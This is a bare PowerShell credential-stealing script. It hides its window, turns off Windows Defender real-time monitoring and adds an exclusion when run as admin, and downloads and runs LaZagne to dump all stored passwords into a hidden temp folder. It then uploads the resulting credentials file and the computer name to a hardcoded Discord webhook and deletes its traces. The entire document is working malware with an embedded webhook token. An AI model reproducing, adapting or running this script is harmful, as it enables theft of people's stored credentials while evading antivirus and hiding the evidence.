$webhook = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC";
$IsAdmin = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$Admin = $IsAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$dir = "$env:temp\JHknfuiD"
$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
Function HideConsole{
    If ($HideWindow -gt 0){
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
        if($hwnd -ne [System.IntPtr]::Zero){
            $Type::ShowWindowAsync($hwnd, 0)
        }
        else{
            $Host.UI.RawUI.WindowTitle = 'hideme'
            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
            $hwnd = $Proc.MainWindowHandle
            $Type::ShowWindowAsync($hwnd, 0)
        }
    }
}
HideConsole
if (!(Test-Path -Path "$dir")) {
New-Item -ItemType Directory -Path "$dir"
}
if (-not $version) {
  $version = "2.4.6"
}
$log = "$dir\$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
$verm = "v$version"
$zelda = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" 
if ($Admin -eq 'True') {
  Set-MpPreference -DisableRealtimeMonitoring $true

  Add-MpPreference -ExclusionPath "$dir"
}
$hide = Get-Item "$dir" -Force
$hide.attributes='Hidden'
Invoke-WebRequest -Uri "$zelda" -OutFile "$dir\lazagne.exe"
& "$dir\lazagne.exe" all -vv > "$log"
curl.exe -F "payload_json={\`"username\`": \`"$env:ComputerName\`", \`"content\`": \`"New File Uploaded`!\n(Admin: $Admin) \`"}" -F "file=@\`"$log\`"" $webhook >$null 2>&1
Start-Sleep -Seconds 20
$unhide = Get-Item "$dir" -Force
$unhide.attributes='Normal'
Remove-Item -Path "$dir" -Recurse -Force
